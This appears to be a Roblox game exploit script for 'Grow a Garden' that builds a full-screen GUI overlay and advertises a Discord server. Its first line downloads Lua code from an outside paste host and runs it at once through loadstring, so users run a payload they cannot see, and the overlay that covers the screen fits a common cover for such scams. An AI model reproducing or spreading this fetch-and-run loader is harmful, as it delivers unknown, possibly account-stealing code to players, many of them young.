loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/4djWEYTbTDEMzpfQ/raw", true))()
local gui = Instance.new("ScreenGui")
gui.Name = "GrowGui"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = game:GetService("CoreGui")
local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
local gradient = Instance.new("UIGradient", bg)
gradient.Color = ColorSequence.new{
  ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
  ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 40, 80)),
  ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
}
gradient.Rotation = 45
local title = Instance.new("TextLabel", bg)
title.Size = UDim2.new(1, 0, 0.2, 0)
title.Position = UDim2.new(0, 0, 0.05, 0)
title.Text = "ðŸŒ´ GROW A\nGARDEN ðŸŒ´"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBlack
title.BackgroundTransparency = 1
local sub = Instance.new("TextLabel", bg)
sub.Size = UDim2.new(1, 0, 0.05, 0)
sub.Position = UDim2.new(0, 0, 0.3, 0)
sub.Text = ""
sub.TextColor3 = Color3.fromRGB(200, 200, 200)
sub.TextScaled = true
sub.Font = Enum.Font.Gotham
sub.BackgroundTransparency = 1
local discord = Instance.new("TextLabel", bg)
discord.Size = UDim2.new(1, 0, 0.05, 0)
discord.Position = UDim2.new(0, 0, 0.37, 0)
discord.Text = "discord.gg/darkzzscripterzz"
